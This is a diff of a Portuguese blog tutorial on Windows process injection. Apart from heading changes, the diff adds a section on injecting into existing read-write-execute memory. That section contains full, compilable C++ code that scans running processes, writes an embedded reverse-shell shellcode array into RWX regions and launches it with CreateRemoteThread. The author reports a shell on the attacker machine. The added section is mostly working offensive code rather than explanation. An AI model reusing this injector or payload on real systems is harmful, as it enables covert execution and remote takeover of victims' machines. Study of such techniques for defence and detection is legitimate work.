@@ -136,7 +136,7 @@ Se a função for bem-sucedida, o valor de retorno será um identificador para a
 
 A junção destas funções consegue completar o ciclo descrito no modelo conceitual ilustrado.
 
-## *Code Injection*
+# *Code Injection*
 
 O nosso *payload* pode ter uma infinidade de formatos, um dos mais clássicos é o *code injection*, onde um código, ou *shellcode* é injetado em um processo.
 
@@ -334,7 +334,7 @@ Quando expandimos o processo Notepad.exe e analisamos a aba "*Memory*", podemos 
 
 E se analisarmos as DLLs carregadas, vemos que o Notepad carregou a `ws2_32.dll` responsável pela comunicação TCP, algo que nunca aconteceria em circunstâncias normais.
 
-## *DLL Injection*
+# *DLL Injection*
 
 Outra técnica de *process injection* bastante difundida é o *DLL Injection*, onde forçamos uma aplicação a carregar uma DLL maliciosa. Por mais que DLLs e .exe façam parta da mesma família, é preciso entender um pouco sobre suas diferenças e sobre a estrutura básica de uma DLL.
 
@@ -388,7 +388,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 }
 ```
 
-### Eventos da DllMain
+## Eventos da DllMain
 
 1. **DLL_PROCESS_ATTACH:**
     
@@ -410,7 +410,7 @@ BOOL APIENTRY DllMain(HMODULE hModule,
 
 Uma DLL "convencional" tem, além da `DllMain` uma série de funções para serem exportadas (essa é sua função), porém, no contexto *hacking* dificilmente há necessidade de haver outras funções. Isso se dá pelo fato de que a `DllMain` é executada instantaneamente assim que a DLL é carregada em um processo, fazendo com que todo o código malicioso que ela contenha, também seja descarregado. PPortanto, estaé a solução mais simples.
 
-### Criando uma DLL
+## Criando uma DLL
 
 Para fins de estudo, criaremos nossa própria DLL para ser usada no *process injection*, a idéia é criar uma simples caixa de texto que será invocada quando a DLL for carregada em um processo já existente.
 
@@ -448,7 +448,7 @@ x86_64-w64-mingw32-g++ -shared -o mydll.dll mydll.cpp -fpermissive
 
 Após a compilação, podemos armazená-la em algum diretório da máquina alvo, em meu caso ficará em `c:\mydll.dll`.
 
-### Injetando a DLL
+## Injetando a DLL
 
 O programa que fará a injeção da DLL é basicamente o mesmo utilizado para injeção de código, pois o processo é idêntico, somente três implementações foram feitas:
 
@@ -544,7 +544,7 @@ Se analisarmos com o *Process Hacker 2* pela aba "*Memory*", podemos ver na áre
 
 ![](/img/posts/Pasted%20image%2020240807220003.png)
 
-## *Thread Hijacking*
+# *Thread Hijacking*
 
 Nos exemplos anteriores testamos injeção tanto de código quanto de DLL, ambos os processos quase iguais, a diferenciar pouca coisa, porém, uma característica em comum entre ambas as técnicas é a criação de uma nova *thread* que executa o *payload*. Utilizamos nos exemplos a função `CreateRemoteThread` para este fim.
 
@@ -750,6 +750,200 @@ Ao analisarmos com o *Process Hacker 2*, vemos que o notepad tem um processo fil
 
 Porém, uma característica única desse método, é que, mesmo que o notepad seja encerrado, a *thread* continua existindo em *background* e o *payload* ainda em execução.
 
+# Injeção em Memória RWX
+
+Seguindo com o modelo conceitual descrito no processo explorado neste artigo, todas as técnicas até então têm uma caraterística em comum: em todos os casos, alocamos um espaço de memória com permissão RWX (leitura, escrita e execução) em um processo existente de nossa escolha. Fazemos isso com a função `VirtualAllocEx` utilizando o argumento `PAGE_EXECUTE_READWRITE`.
+
+Porém, se analisarmos de forma global, são muitos os processos que estão em execução simultaneamente durante o funcionamento do SO, e, é muito provável, que algum processa já possa ter alocado um espaço de memória com tais permissões para seu próprio funcionamento.
+
+A ideia nesta técnica, é "caçar" entre os processos em execução, algum que já tenha alocado um *buffer* com permissão RWX, injetar nosso *payload* neste *buffer* e executá-lo.
+
+Os recursos básicos para isso, já exploramos anteriormente, pois podemos criar o *snapshot* com todas as informações necessárias sobre os processos em execução. Para mapear os espaços de memória, podemos utilizar a função [VirtualQueryEx](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex) que captura informações sobre um intervalo de páginas dentro de um espaço de endereço virtual. Sua sintaxe é:
+
+```cpp
+SIZE_T VirtualQueryEx(
+  [in]           HANDLE                    hProcess,
+  [in, optional] LPCVOID                   lpAddress,
+  [out]          PMEMORY_BASIC_INFORMATION lpBuffer,
+  [in]           SIZE_T                    dwLength
+);
+```
+
+Onde:
+
+- `[in] hProcess` é um *handle* para um processo em execução;
+- `[in, optional] lpAddress` um ponteiro para o endereço base da região de páginas a serem consultadas;
+- `[out] lpBuffer` um ponteiro para uma estrutura MEMORY_BASIC_INFORMATION na qual informações sobre o intervalo de páginas especificado são retornadas;
+- `[in] dwLength` o tamanho do *buffer* apontado pelo parâmetro lpBuffer , em bytes.
+
+Conforme analisado, é preciso ter um ponteiro para a estrutura [MEMORY_BASIC_INFORMATION](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information), esta estrutura conterá as informações que precisamos sobre aquele espaço de memória analisado, suas informações são:
+
+```cpp
+typedef struct _MEMORY_BASIC_INFORMATION {
+  PVOID  BaseAddress;
+  PVOID  AllocationBase;
+  DWORD  AllocationProtect;
+  WORD   PartitionId;
+  SIZE_T RegionSize;
+  DWORD  State;
+  DWORD  Protect;
+  DWORD  Type;
+} MEMORY_BASIC_INFORMATION, *PMEMORY_BASIC_INFORMATION;
+```
+
+Como podemos ver, temos a informação `AllocationProtect` que contém o permissionamento daquela região de memória.
+
+Seguindo por partes, vamos primeiramente criar umn programa que irá extrair um *snapshot* do estado dos processos, fará um *loop* entre os processos e analisará o espaço de memória de cada um, quando encontrar algum espaço com as permissões RWX, o programa nos retornará o nome do processo e o endereço de memória.
+
+```cpp
+#include <windows.h>
+#include <stdio.h>
+#include <tlhelp32.h>
+
+int main() {
+    MEMORY_BASIC_INFORMATION mem; //estrutura para armazenar informacoes
+    PROCESSENTRY32 pe32; // estrutura para armazenar o snapshot
+    LPVOID baseAddress = 0; // valor inicial para base address de cada processo
+    HANDLE ph; // handle para o processo
+    HANDLE hSnapshot; // handle para o snapshot
+    BOOL proc;
+    pe32.dwSize = sizeof(PROCESSENTRY32); // inicializando o PROCESSENTRY32
+
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hSnapshot) return -1;
+
+    proc = Process32First(hSnapshot, &pe32);
+
+    // inicio do loop entre os processos
+    while (proc) {
+        ph = OpenProcess(MAXIMUM_ALLOWED, false, pe32.th32ProcessID);
+        if (ph) {
+            printf("Procurando no processo %s\n", pe32.szExeFile);
+            // loop entre todos os blocos de memoria alocados pelo processo
+            while (VirtualQueryEx(ph, baseAddress, &mem, sizeof(mem))) {
+                baseAddress = (LPVOID)((DWORD_PTR)mem.BaseAddress + mem.RegionSize);
+                // checando se o bloco tem permissao RWX
+                if (mem.AllocationProtect == PAGE_EXECUTE_READWRITE) {
+                    printf("Memoria RWX encontrada em 0x%x \n", mem.BaseAddress);
+                    break;
+                }
+            }
+            baseAddress = 0;
+        }
+        proc = Process32Next(hSnapshot, &pe32);
+    }
+    CloseHandle(hSnapshot);
+    CloseHandle(ph);
+    return 0;
+}
+```
+
+Podemos compilar o programa:
+
+```bash
+$ x86_64-w64-mingw32-g++ huntingMemory.cpp -o huntingMemory.exe -mconsole -s -ffunction-sections -fdata-sections -Wno-write-strings -Wint-to-pointer-cast -fno-exceptions -fmerge-all-constants -static-libstdc++ -static-libgcc -fpermissive
+```
+
+Quando executamos o programa, encontramos vários possíveis pontos de injeção:
+
+![](/img/posts/Pasted%20image%2020240809082245.png)
+
+Uma vez que conseguimos enumerar os pontos, podemos aproveitar o *loop* para injetar nosso *payload* e executálo. A implementação no código fica da seguinte forma:
+
+```cpp
+#include <windows.h>
+#include <stdio.h>
+#include <tlhelp32.h>
+
+unsigned char payload[] = "\xfc\x48\x83\xe4\xf0\xe8\xc0\x00\x00\x00\x41\x51\x41\x50"
+"\x52\x51\x56\x48\x31\xd2\x65\x48\x8b\x52\x60\x48\x8b\x52"
+"\x18\x48\x8b\x52\x20\x48\x8b\x72\x50\x48\x0f\xb7\x4a\x4a"
+"\x4d\x31\xc9\x48\x31\xc0\xac\x3c\x61\x7c\x02\x2c\x20\x41"
+"\xc1\xc9\x0d\x41\x01\xc1\xe2\xed\x52\x41\x51\x48\x8b\x52"
+"\x20\x8b\x42\x3c\x48\x01\xd0\x8b\x80\x88\x00\x00\x00\x48"
+"\x85\xc0\x74\x67\x48\x01\xd0\x50\x8b\x48\x18\x44\x8b\x40"
+"\x20\x49\x01\xd0\xe3\x56\x48\xff\xc9\x41\x8b\x34\x88\x48"
+"\x01\xd6\x4d\x31\xc9\x48\x31\xc0\xac\x41\xc1\xc9\x0d\x41"
+"\x01\xc1\x38\xe0\x75\xf1\x4c\x03\x4c\x24\x08\x45\x39\xd1"
+"\x75\xd8\x58\x44\x8b\x40\x24\x49\x01\xd0\x66\x41\x8b\x0c"
+"\x48\x44\x8b\x40\x1c\x49\x01\xd0\x41\x8b\x04\x88\x48\x01"
+"\xd0\x41\x58\x41\x58\x5e\x59\x5a\x41\x58\x41\x59\x41\x5a"
+"\x48\x83\xec\x20\x41\x52\xff\xe0\x58\x41\x59\x5a\x48\x8b"
+"\x12\xe9\x57\xff\xff\xff\x5d\x49\xbe\x77\x73\x32\x5f\x33"
+"\x32\x00\x00\x41\x56\x49\x89\xe6\x48\x81\xec\xa0\x01\x00"
+"\x00\x49\x89\xe5\x49\xbc\x02\x00\x20\xfb\xc0\xa8\x47\x80"
+"\x41\x54\x49\x89\xe4\x4c\x89\xf1\x41\xba\x4c\x77\x26\x07"
+"\xff\xd5\x4c\x89\xea\x68\x01\x01\x00\x00\x59\x41\xba\x29"
+"\x80\x6b\x00\xff\xd5\x50\x50\x4d\x31\xc9\x4d\x31\xc0\x48"
+"\xff\xc0\x48\x89\xc2\x48\xff\xc0\x48\x89\xc1\x41\xba\xea"
+"\x0f\xdf\xe0\xff\xd5\x48\x89\xc7\x6a\x10\x41\x58\x4c\x89"
+"\xe2\x48\x89\xf9\x41\xba\x99\xa5\x74\x61\xff\xd5\x48\x81"
+"\xc4\x40\x02\x00\x00\x49\xb8\x63\x6d\x64\x00\x00\x00\x00"
+"\x00\x41\x50\x41\x50\x48\x89\xe2\x57\x57\x57\x4d\x31\xc0"
+"\x6a\x0d\x59\x41\x50\xe2\xfc\x66\xc7\x44\x24\x54\x01\x01"
+"\x48\x8d\x44\x24\x18\xc6\x00\x68\x48\x89\xe6\x56\x50\x41"
+"\x50\x41\x50\x41\x50\x49\xff\xc0\x41\x50\x49\xff\xc8\x4d"
+"\x89\xc1\x4c\x89\xc1\x41\xba\x79\xcc\x3f\x86\xff\xd5\x48"
+"\x31\xd2\x48\xff\xca\x8b\x0e\x41\xba\x08\x87\x1d\x60\xff"
+"\xd5\xbb\xf0\xb5\xa2\x56\x41\xba\xa6\x95\xbd\x9d\xff\xd5"
+"\x48\x83\xc4\x28\x3c\x06\x7c\x0a\x80\xfb\xe0\x75\x05\xbb"
+"\x47\x13\x72\x6f\x6a\x00\x59\x41\x89\xda\xff\xd5";
+
+int main() {
+    MEMORY_BASIC_INFORMATION mem; //estrutura para armazenar informacoes
+    PROCESSENTRY32 pe32; // estrutura para armazenar o snapshot
+    LPVOID baseAddress = 0; // valor inicial para base address de cada processo
+    HANDLE ph; // handle para o processo
+    HANDLE hSnapshot; // handle para o snapshot
+    BOOL proc;
+    pe32.dwSize = sizeof(PROCESSENTRY32); // inicializando o PROCESSENTRY32
+
+    hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
+    if (INVALID_HANDLE_VALUE == hSnapshot) return -1;
+
+    proc = Process32First(hSnapshot, &pe32);
+
+    // inicio do loop entre os processos
+    while (proc) {
+        ph = OpenProcess(MAXIMUM_ALLOWED, false, pe32.th32ProcessID);
+        if (ph) {
+            printf("Procurando no processo %s\n", pe32.szExeFile);
+            // loop entre todos os blocos de memoria alocados pelo processo
+            while (VirtualQueryEx(ph, baseAddress, &mem, sizeof(mem))) {
+                baseAddress = (LPVOID)((DWORD_PTR)mem.BaseAddress + mem.RegionSize);
+                // checando se o bloco tem permissao RWX
+                if (mem.AllocationProtect == PAGE_EXECUTE_READWRITE) {
+                    printf("Memoria RWX encontrada em 0x%x \n", mem.BaseAddress);
+                    WriteProcessMemory(ph, mem.BaseAddress, payload, sizeof(payload), NULL);
+                    CreateRemoteThread(ph, NULL, NULL, (LPTHREAD_START_ROUTINE)mem.BaseAddress, NULL, NULL, NULL);
+                    break;
+                }
+            }
+            baseAddress = 0;
+        }
+        proc = Process32Next(hSnapshot, &pe32);
+    }
+    CloseHandle(hSnapshot);
+    CloseHandle(ph);
+    return 0;
+}
+```
+
+Após a compilação, quando executamos o programa, temos o *reverse shell* na máquina atacante.
+
+![](/img/posts/Pasted%20image%2020240809083025.png)
+
+Agora, com um olhar mais analítico, uma vez que fazemos um *loop* nos processos e procuramos todos os espaços com permissão RWX e injetamos o *payload*, podemos ulhar no *Process Hacker* que o *exploit* foi executado em mias de um processo.
+
+![](/img/posts/Pasted%20image%2020240809083240.png)
+
+Temos 3 processos que aceitaram a execução do *payload* e se olharmos a saída do programa, veremos que realmente foram enumerados como possíveis alvos.
+
+![](/img/posts/Pasted%20image%2020240809083421.png)
+
+Obviamente, estas técnicas podem ser combinadas e com toda certeza do mundo podem ser melhoradas. Porém, são informações que valem muito a pena ter no arsenal.
+
+
 # Limitações
 
 Assim como todo processo em sua forma mais básica, estes métodos aqui apresentados apresentam algumas limitações.
@@ -835,3 +1029,5 @@ Ao continuarmos a expandir nosso conhecimento sobre técnicas como o _Process In
 - [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-getthreadcontext)
 - [https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-context)
 - [https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext)
+- [https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualqueryex)
+- [https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information](https://learn.microsoft.com/en-us/windows/win32/api/winnt/ns-winnt-memory_basic_information)
